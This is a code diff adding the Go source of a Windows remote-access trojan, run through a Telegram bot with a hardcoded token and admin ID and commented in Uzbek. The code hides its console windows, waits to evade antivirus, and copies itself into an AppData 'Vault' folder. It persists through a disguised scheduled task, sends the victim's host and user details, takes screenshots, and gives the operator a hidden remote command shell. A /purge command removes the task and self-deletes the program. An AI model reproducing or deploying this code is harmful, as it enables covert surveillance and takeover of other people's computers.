@@ -1,0 +1,214 @@
+package main
+
+import (
+	"fmt"
+	"image/png"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
+	"strconv"
+	"syscall"
+	"time"
+
+	"github.com/kbinani/screenshot"
+	tele "gopkg.in/telebot.v3"
+)
+
+// ================= Config & Globals =================
+var (
+	T             = "8536931376:AAEuf35FhfFdOKoZsyqnApDRkx7olCX8xHc"
+	A             = "6504383276"
+	AdminID       int64
+	currentTarget string 
+	shMode        = true
+	myHostName, _ = os.Hostname()
+
+	persistentCmd *exec.Cmd
+	cmdStdin      io.WriteCloser
+)
+
+// ================= Stealth & Background Logic =================
+
+// setStealth - CMD oynasini butunlay yashirish va yaratilmasligini ta'minlash
+func setStealth(attr *syscall.SysProcAttr) {
+	if runtime.GOOS == "windows" {
+		attr.HideWindow = true
+		// CREATE_NO_WINDOW: 0x08000000 - Bu flag CMD oynasini miltillashini ham to'xtatadi
+		attr.CreationFlags = 0x08000000
+	}
+}
+
+func autoStart() {
+	if runtime.GOOS != "windows" { return }
+	
+	// AppData/Roaming/Microsoft/Windows/Vault ichiga yashirinish
+	targetDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Vault")
+	targetExe := filepath.Join(targetDir, "win_vault.exe")
+	self, _ := os.Executable()
+
+	if filepath.Clean(self) != filepath.Clean(targetExe) {
+		os.MkdirAll(targetDir, 0755)
+		
+		// Faylni nusxalash
+		src, _ := os.Open(self); dst, _ := os.Create(targetExe)
+		io.Copy(dst, src); src.Close(); dst.Close()
+
+		// Task Scheduler orqali avto-start qo'shish (Ko'rinmas rejimda)
+		cmd := exec.Command("schtasks", "/create", "/tn", "WinVaultUpdate", "/tr", targetExe, "/sc", "onlogon", "/rl", "highest", "/f")
+		cmd.SysProcAttr = &syscall.SysProcAttr{}
+		setStealth(cmd.SysProcAttr)
+		cmd.Run()
+
+		// Yangi joydan ko'rinmas holda ishga tushirish
+		startCmd := exec.Command(targetExe)
+		startCmd.SysProcAttr = &syscall.SysProcAttr{}
+		setStealth(startCmd.SysProcAttr)
+		startCmd.Start()
+		
+		os.Exit(0)
+	}
+}
+
+// ================= Terminal Logic =================
+
+func startPersistentCmd(c tele.Context) {
+	if persistentCmd != nil { return }
+	persistentCmd = exec.Command("cmd.exe")
+	persistentCmd.SysProcAttr = &syscall.SysProcAttr{}
+	setStealth(persistentCmd.SysProcAttr)
+
+	stdin, _ := persistentCmd.StdinPipe()
+	stdout, _ := persistentCmd.StdoutPipe()
+	cmdStdin = stdin
+	persistentCmd.Start()
+
+	go func() {
+		buf := make([]byte, 4096)
+		for {
+			n, err := stdout.Read(buf)
+			if n > 0 {
+				res := string(buf[:n])
+				if len(res) > 4000 { res = res[:4000] }
+				c.Send("```\n"+res+"\n```", tele.ModeMarkdown)
+			}
+			if err != nil { persistentCmd = nil; break }
+		}
+	}()
+}
+
+// ================= Main Body =================
+
+func main() {
+	// Antiviruslarni chalg'itish uchun kutish
+	time.Sleep(5 * time.Second)
+	autoStart()
+
+	AdminID, _ = strconv.ParseInt(A, 10, 64)
+
+	bot, err := tele.NewBot(tele.Settings{
+		Token:  T,
+		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
+	})
+	if err != nil { return }
+
+	// Onlaynlik bildirishnomasi
+	go func() {
+		time.Sleep(2 * time.Second)
+		user := os.Getenv("USERNAME")
+		msg := fmt.Sprintf("🔌 **Sakinai Online**\nHost: `%s`\nUser: `%s`", myHostName, user)
+		bot.Send(tele.ChatID(AdminID), msg, tele.ModeMarkdown)
+	}()
+
+	// Middleware: Faqat Admin va Tanlangan PC uchun
+	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
+		return func(c tele.Context) error {
+			if c.Sender().ID != AdminID { return nil }
+			if c.Text() == "/start" || c.Callback() != nil {
+				return next(c)
+			}
+			if currentTarget != myHostName {
+				return nil
+			}
+			return next(c)
+		}
+	})
+
+	// Boshqaruv paneli (Tugmalar)
+	bot.Handle("/start", func(c tele.Context) error {
+		selector := &tele.ReplyMarkup{}
+		btn := selector.Data("🖥 "+myHostName, "target", myHostName)
+		selector.Inline(selector.Row(btn))
+		return c.Send("📋 **Onlayn Botlar:**\nBoshqarish uchun tanlang:", selector)
+	})
+
+	bot.Handle(tele.OnCallback, func(c tele.Context) error {
+		selected := c.Callback().Data
+		// Callback prefixini tekshirish
+		if len(selected) > 7 && selected[1:7] == "target" {
+			pcName := selected[8:]
+			if pcName == myHostName {
+				currentTarget = myHostName
+				c.Send("🎯 **Fokus yoqildi:** `" + myHostName + "`")
+			} else {
+				currentTarget = "" 
+			}
+		}
+		return c.Respond()
+	})
+
+	// Buyruqlar
+	bot.Handle("/screen", func(c tele.Context) error {
+		n := screenshot.NumActiveDisplays()
+		for i := 0; i < n; i++ {
+			bounds := screenshot.GetDisplayBounds(i)
+			img, _ := screenshot.CaptureRect(bounds)
+			path := filepath.Join(os.TempDir(), fmt.Sprintf("s_%d.png", i))
+			f, _ := os.Create(path); png.Encode(f, img); f.Close()
+			c.Send(&tele.Photo{File: tele.FromDisk(path)})
+			os.Remove(path)
+		}
+		return nil
+	})
+
+	bot.Handle("/ip", func(c tele.Context) error {
+		resp, _ := http.Get("https://api.ipify.org")
+		ip, _ := io.ReadAll(resp.Body)
+		return c.Send("🌐 **Host:** "+myHostName+"\n📍 **IP:** "+string(ip))
+	})
+
+	bot.Handle("/purge", func(c tele.Context) error {
+		// O'zini o'chirish buyrug'i ham ko'rinmas bajariladi
+		delCmd := exec.Command("schtasks", "/delete", "/tn", "WinVaultUpdate", "/f")
+		delCmd.SysProcAttr = &syscall.SysProcAttr{}
+		setStealth(delCmd.SysProcAttr)
+		delCmd.Run()
+
+		self, _ := os.Executable()
+		batch := fmt.Sprintf("@echo off\ntimeout /t 2\ndel /f /q \"%s\"\ndel %%0", self)
+		batchPath := filepath.Join(os.TempDir(), "d.bat")
+		os.WriteFile(batchPath, []byte(batch), 0644)
+		
+		finalCmd := exec.Command("cmd", "/c", batchPath)
+		finalCmd.SysProcAttr = &syscall.SysProcAttr{}
+		setStealth(finalCmd.SysProcAttr)
+		finalCmd.Start()
+		
+		os.Exit(0)
+		return nil
+	})
+
+	bot.Handle(tele.OnText, func(c tele.Context) error {
+		if shMode {
+			if persistentCmd == nil { startPersistentCmd(c) }
+			if cmdStdin != nil {
+				fmt.Fprintln(cmdStdin, c.Text())
+			}
+		}
+		return nil
+	})
+
+	bot.Start()
+}
